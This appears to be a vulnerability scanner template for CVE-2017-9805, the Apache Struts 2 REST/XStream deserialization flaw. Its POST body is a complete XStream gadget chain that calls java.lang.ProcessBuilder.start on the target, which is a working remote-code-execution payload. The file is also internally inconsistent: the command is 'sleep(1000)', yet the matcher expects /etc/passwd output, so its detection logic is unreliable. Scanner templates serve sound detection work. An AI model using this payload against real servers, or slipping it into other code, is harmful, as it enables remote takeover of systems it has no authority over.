id: CVE-2017-9805

info:
  name: Struts 2 REST plugin with XStream handler RCE
  author: z3bd
  severity: critical
  description: A RCE attack is possible when using the Struts REST plugin with XStream handler to deserialise XML requests
  tags: cve,cve2017,struts2

  # References:
  #  - https://struts.apache.org/docs/s2-052.htm
  #  - https://blog.semmle.com/cve-2017-9805/

requests:
  - method: GET
    path:
      - "{{BaseURL}}/struts2-rest-showcase/orders.xhtml"
      - "{{BaseURL}}/struts2-rest-showcase-2.3.11/orders.xhtml"
      - "{{BaseURL}}/struts2-rest-showcase-2.5.10/orders.xhtml"
      - "{{BaseURL}}/struts2-rest-showcase-2.5.12/orders.xhtml"
    matchers:
      - type: status
        status:
          - 200
  - method: POST
    path:
      - "{{BaseURL}}/struts2-rest-showcase/orders/3"
      - "{{BaseURL}}/struts2-rest-showcase-2.3.1/orders/3"
      - "{{BaseURL}}/struts2-rest-showcase-2.5.10/orders/3"
      - "{{BaseURL}}/struts2-rest-showcase-2.5.12/orders/3"
    headers:
      Content-Type: application/xml
    body: |
      <map>
        <entry>
          <jdk.nashorn.internal.objects.NativeString>
            <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
              <dataHandler>
                <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                  <is class="javax.crypto.CipherInputStream">
                    <cipher class="javax.crypto.NullCipher">
                      <serviceIterator class="javax.imageio.spi.FilterIterator">
                        <iter class="javax.imageio.spi.FilterIterator">
                          <iter class="java.util.Collections$EmptyIterator"/>
                          <next class="java.lang.ProcessBuilder">
                            <command>
                              <string>sleep(1000)</string>
                            </command>
                          </next>
                        </iter>
                        <filter class="javax.imageio.ImageIO$ContainsFilter">
                          <method>
                            <class>java.lang.ProcessBuilder</class>
                            <name>start</name>
                            <parameter-types/>
                          </method>
                        </filter>
                        <next></next>
                      </serviceIterator>
                      <lock/>
                    </cipher>
                    <input class="java.lang.ProcessBuilder$NullInputStream"/>
                    <ibuffer/>
                  </is>
                </dataSource>
              </dataHandler>
            </value>
          </jdk.nashorn.internal.objects.NativeString>
          <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
        </entry>
      </map>
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body
